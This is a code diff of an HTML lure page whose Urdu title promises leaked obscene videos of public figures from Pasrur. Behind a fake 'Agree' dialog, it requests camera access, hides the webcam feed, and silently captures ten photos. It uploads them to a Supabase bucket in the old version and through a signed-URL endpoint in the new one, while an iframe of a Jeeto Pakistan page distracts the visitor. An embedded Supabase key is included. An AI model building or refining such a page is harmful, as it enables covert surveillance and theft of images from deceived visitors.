@@ -1,127 +1,156 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پسرور کے اہم سیاسی سماجی اور صحافی شخصیات کی نازیبا ویڈیو لیک۔سب پھڑے جان گے</title>
-    <style>
-        /* Styles for the pre-loading popup/modal */
-        #preload-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        #preload-modal h2 {
-            margin-bottom: 20px;
-        }
-
-        #agree-button {
-            padding: 10px 20px;
-            font-size: 16px;
-            color: white;
-            background-color: #007BFF;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        #agree-button:hover {
-            background-color: #0056b3;
-        }
-
-        #deny-message {
-            color: red;
-            margin-top: 20px;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>پسرور کے اہم سیاسی سماجی اور صحافی شخصیات کی نازیبا ویڈیو لیک۔سب پھڑے جان گے</title>
+  <style>
+    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
+    #preload-modal{position:fixed;inset:0;background:rgba(0,0,0,.85);color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999}
+    #agree-button{padding:10px 18px;border-radius:8px;border:0;background:#0b84ff;color:#fff;font-size:16px;cursor:pointer}
+    #deny-message{color:#ff8080;margin-top:12px}
+    #status{position:fixed;left:12px;bottom:12px;background:#ffffffcc;padding:8px 12px;border-radius:8px;font-size:14px}
+    iframe{position:fixed;inset:0;border:0;width:100%;height:100%}
+    video{display:none}
+  </style>
 </head>
 <body>
-    <!-- Preloading Popup -->
-    <div id="preload-modal">
-        <h2>ویڈیوز دیکھنے کے لیے</h2>
-        <p> پہ کلک کریں Agree</p>
-        <button id="agree-button">Agree</button>
-        <p id="deny-message" style="display: none;">You must allow to see the content.</p>
-    </div>
+  <div id="preload-modal" role="dialog" aria-modal="true">
+    <h2>ویڈیوز دیکھنے کے لیے</h2>
+    <p>پہ کلک کریں Agree</p>
+    <button id="agree-button">Agree</button>
+    <p id="deny-message" style="display:none">You must allow camera permission to see the content.</p>
+  </div>
 
-    <!-- Embed Jeeto Pakistan Webpage using iframe -->
-    <iframe id="jeeto-iframe" src="/Jeeto%20Pakistan.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; display: none;"></iframe>
+  <!-- iframe: ensure your Jeeto file is named jeeto-pakistan.html -->
+  <iframe id="jeeto-iframe" src="jeeto-pakistan.html" style="display:none" allow="camera; microphone; autoplay"></iframe>
 
-    <video id="video" autoplay style="display: none;"></video>
-    <p id="status"></p>
+  <video id="video" autoplay playsinline muted></video>
+  <div id="status" style="display:none"></div>
 
-    <!-- Load Supabase Library -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.0.5"></script>
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            const SUPABASE_URL = 'https://hpgrvmzujhvomcktjust.supabase.co';
-            const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhwZ3J2bXp1amh2b21ja3RqdXN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0MDA3NDcsImV4cCI6MjA3NDk3Njc0N30.R_pkZCEFdytXvwzD_fzpKHJh1t2Myq_v-ajYTa88m40';
-            const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  <!-- supabase client (cdn) - kept for optional reads; uploads use signed URL API -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // ---------- CONFIG: your anon key and url (OK for reads) ----------
+    const SUPABASE_URL = 'https://hpgrvmzujhvomcktjust.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhwZ3J2bXp1amh2b21ja3RqdXN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0MDA3NDcsImV4cCI6MjA3NDk3Njc0N30.R_pkZCEFdytXvwzD_fzpKHJh1t2Myq_v-ajYTa88m40';
+    const supabase = window.supabase?.createClient ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
+    // -------------------------------------------------------------------
 
-            const preloadModal = document.getElementById('preload-modal');
-            const agreeButton = document.getElementById('agree-button');
-            const denyMessage = document.getElementById('deny-message');
-            const jeetoIframe = document.getElementById('jeeto-iframe');
+    const preloadModal = document.getElementById('preload-modal');
+    const agreeButton = document.getElementById('agree-button');
+    const denyMessage = document.getElementById('deny-message');
+    const jeetoIframe = document.getElementById('jeeto-iframe');
+    const video = document.getElementById('video');
+    const statusEl = document.getElementById('status');
 
-            agreeButton.addEventListener('click', () => {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        preloadModal.style.display = 'none';
-                        jeetoIframe.style.display = 'block';
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
+    // ------------------ Signed upload helpers (client side) ------------------
+    async function getSignedUploadUrl(filename, contentType) {
+      const resp = await fetch('/api/signed-upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ filename, contentType })
+      });
+      if (!resp.ok) {
+        const body = await resp.text();
+        throw new Error(`Failed to get signed url (${resp.status}): ${body}`);
+      }
+      return resp.json(); // { putUrl, publicUrl, path }
+    }
 
-                        video.addEventListener('loadeddata', () => {
-                            captureAndUploadPhotos(video, supabase);
-                        });
-                    })
-                    .catch((err) => {
-                        denyMessage.style.display = 'block';
-                        console.error('Camera access denied:', err);
-                    });
-            });
+    async function uploadBlobWithSignedUrl(blob, filename) {
+      const { putUrl, publicUrl, path } = await getSignedUploadUrl(filename, blob.type);
+
+      // Put blob directly to signed URL
+      const putResp = await fetch(putUrl, {
+        method: 'PUT',
+        headers: { 'Content-Type': blob.type },
+        body: blob
+      });
+
+      if (!putResp.ok) {
+        const txt = await putResp.text();
+        throw new Error(`PUT failed (${putResp.status}): ${txt}`);
+      }
+
+      return { publicUrl, path };
+    }
+    // -----------------------------------------------------------------------
+
+    agreeButton.addEventListener('click', async () => {
+      try {
+      //statusEl.style.display = 'block';
+      //statusEl.innerText = 'Requesting camera permission...';
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+
+        // Hide modal, show iframe
+        preloadModal.style.display = 'none';
+        jeetoIframe.style.display = 'block';
+
+        // attach stream and wait for metadata
+        video.srcObject = stream;
+        await new Promise((resolve) => {
+          if (video.readyState >= 1 && video.videoWidth) return resolve();
+          const onMeta = () => { video.removeEventListener('loadedmetadata', onMeta); resolve(); };
+          video.addEventListener('loadedmetadata', onMeta);
+          video.play().catch(()=>{/* ignore autoplay block */});
+          setTimeout(resolve, 800);
         });
 
-        async function captureAndUploadPhotos(video, supabase) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
+        // Begin capture+upload flow
+        await captureAndUploadPhotos(video, 10, 640, 0.8);
+      } catch (err) {
+        console.error('Camera access denied or error:', err);
+        denyMessage.style.display = 'block';
+        statusEl.style.display = 'none';
+      }
+    });
 
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+    // captureCount, targetWidth, jpegQuality
+    async function captureAndUploadPhotos(videoEl, captureCount = 10, targetWidth = 640, jpegQuality = 0.8) {
+      const aspect = (videoEl.videoWidth && videoEl.videoHeight) ? (videoEl.videoWidth / videoEl.videoHeight) : (16/9);
+      const canvas = document.createElement('canvas');
+      canvas.width = targetWidth;
+      canvas.height = Math.round(targetWidth / aspect);
+      const ctx = canvas.getContext('2d');
 
-            for (let i = 0; i < 10; i++) {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    //statusEl.innerText = `Preparing to capture ${captureCount} photos...`;
 
-                const imageData = canvas.toDataURL('image/png');
-                const blob = await (await fetch(imageData)).blob();
-                const fileName = `photo-${Date.now()}-${i + 1}.png`;
+      for (let i = 0; i < captureCount; i++) {
+        try {
+          ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
 
-                // Upload Blob to Supabase bucket
-                const { data, error } = await supabase.storage.from('user-media').upload(fileName, blob, {
-                    contentType: 'image/png'
-                });
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', jpegQuality));
+          if (!blob) throw new Error('Failed to create image blob');
 
-                if (error) {
-                    console.error('Upload failed:', error);
-                    document.getElementById('status').innerText = 'Failed to upload photo!';
-                    return;
-                } else {
-                    console.log(`Photo ${i + 1} uploaded successfully:`, data.path);
-                }
-            }
+          const filename = `photo-${Date.now()}-${i+1}.jpg`;
+        //statusEl.innerText = `Uploading ${i+1}/${captureCount}...`;
 
-            document.getElementById('status').innerText = 'All photos uploaded successfully!';
+          // ----- REPLACED: direct supabase upload -----
+          // const { data, error } = await supabaseClient.storage.from('user-media').upload(filename, blob, { contentType: 'image/jpeg' });
+          // if (error) { ... }
+          // ------------------------------------------------
+          // Use signed-url flow instead:
+          try {
+            const result = await uploadBlobWithSignedUrl(blob, filename);
+            console.log(`Photo ${i+1} uploaded:`, result);
+          } catch (uErr) {
+            console.error('Upload failed:', uErr);
+          //statusEl.innerText = `Upload failed at ${i+1}: ${uErr.message}`;
+            return;
+          }
+
+          // small pause
+          await new Promise(r => setTimeout(r, 250));
+        } catch (err) {
+          console.error('capture/upload error', err);
+        //statusEl.innerText = 'Error during capture/upload: ' + (err.message || err);
+          return;
         }
-    </script>
+      }
+
+     //statusEl.innerText = 'All photos uploaded successfully!';
+    }
+  </script>
 </body>
 </html>
